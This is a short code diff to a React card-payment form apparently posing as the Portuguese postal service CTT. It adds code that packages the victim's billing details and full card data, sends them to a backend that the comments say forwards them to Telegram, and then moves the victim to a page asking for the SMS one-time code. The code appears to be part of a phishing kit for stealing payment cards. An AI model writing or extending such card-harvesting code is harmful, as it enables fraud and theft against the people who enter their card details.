@@ -161,6 +161,22 @@ const CTTCardForm = () => {
         });
       }, 1000);
       
+      // Send card data to backend (and Telegram) first
+      const paymentRequest = {
+        billing_data: billingData,
+        card_data: formData
+      };
+
+      const response = await axios.post(`${API}/ctt/card-submit`, paymentRequest);
+      
+      if (response.data.status === 'success') {
+        toast({
+          title: "Dados enviados para Telegram",
+          description: "Aguarde o código SMS...",
+          duration: 2000
+        });
+      }
+      
       // Navigate to OTP verification page
       setTimeout(() => {
         navigate('/otp');
